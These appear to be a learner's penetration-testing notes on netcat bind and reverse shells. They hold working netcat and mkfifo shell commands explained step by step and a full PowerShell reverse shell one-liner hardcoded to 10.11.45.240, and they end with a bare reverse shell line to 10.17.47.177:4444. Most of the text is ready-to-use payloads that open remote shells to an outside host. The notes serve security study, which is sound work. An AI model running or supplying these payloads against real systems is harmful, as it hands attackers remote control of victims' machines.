## netcat connection
##### 1. Executing a process on action using netcat listener. 
**Example** - 
```python
nc -lvnp <PORT> -e /bin/bash
```
Connecting to the above listener with netcat would result in a **bind shell** on the target.

##### 2. Equally, for a reverse shell, connecting back would result in a **reverse shell** on the target with the below command:
```python
nc <LOCAL-IP> <PORT> -e /bin/bash
```

##### 3. On **Linux**, however, we would instead use this code to create a listener for a **bind shell**:
```python
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
1. `mkfifo /tmp/f`: This creates a named pipe (FIFO) called "f" in the "/tmp" directory. A named pipe is a special file that allows two processes to communicate with each other.
    
2. `nc -lvnp <PORT> < /tmp/f`: This sets up a netcat (nc) listener on a specified port (PORT) and redirects the input to come from the named pipe "/tmp/f". Netcat is a utility used for network communication.
    
3. `|`: This symbol is a pipe, connecting the output of the previous command to the input of the next command.
    
4. `/bin/sh`: This starts a shell (command-line interpreter) on the remote system. In this case, it is "/bin/sh", which is typically a symbolic link to the default system shell (like Bash).
    
5. `>/tmp/f`: This redirects the standard output of the shell to the named pipe "/tmp/f", which means any output from the shell will be sent back through the pipe.
    
6. `2>&1`: This redirects the standard error (file descriptor 2) to the same location as the standard output (file descriptor 1). In this case, it's the named pipe "/tmp/f".
    
7. `rm /tmp/f`: This removes the named pipe "/tmp/f" after the command has finished executing.
![[shells9.png]]

##### 4. A very similar command can be used to send a netcat reverse shell:
```python
mkfifo /tmp/f; nc <attacker-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
1. `mkfifo /tmp/f`: This creates a named pipe (FIFO) called "f" in the "/tmp" directory. A named pipe is a special file that allows two processes to communicate with each other.
    
2. `nc <LOCAL-IP> <PORT> < /tmp/f`: This uses netcat (nc) to connect to a specified IP address (LOCAL-IP) and port number (PORT). It redirects the input to come from the named pipe "/tmp/f".
    
3. `|`: This symbol is a pipe, connecting the output of the previous command to the input of the next command.
    
4. `/bin/sh`: This starts a shell (command-line interpreter) on the remote system. In this case, it is "/bin/sh", which is typically a symbolic link to the default system shell (like Bash).
    
5. `>/tmp/f`: This redirects the standard output of the shell to the named pipe "/tmp/f", which means any output from the shell will be sent back through the pipe.
    
6. `2>&1`: This redirects the standard error (file descriptor 2) to the same location as the standard output (file descriptor 1). In this case, it's the named pipe "/tmp/f".
    
7. `rm /tmp/f`: This removes the named pipe "/tmp/f" after the command has finished executing.

![[shells10.png]]

##### 5. Powershell reverse shell to exploit a modern Windows Server
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.45.240',12345);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
- In order to use this, we need to replace "IP" and "port" with an appropriate IP and choice of port.
- The above powershell script will work but you need to url encod it first.
- It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell:
![[shells11.png]]

**For other common reverse shell payloads visit this repo** --> [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

mkfifo /tmp/f; nc 10.17.47.177 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f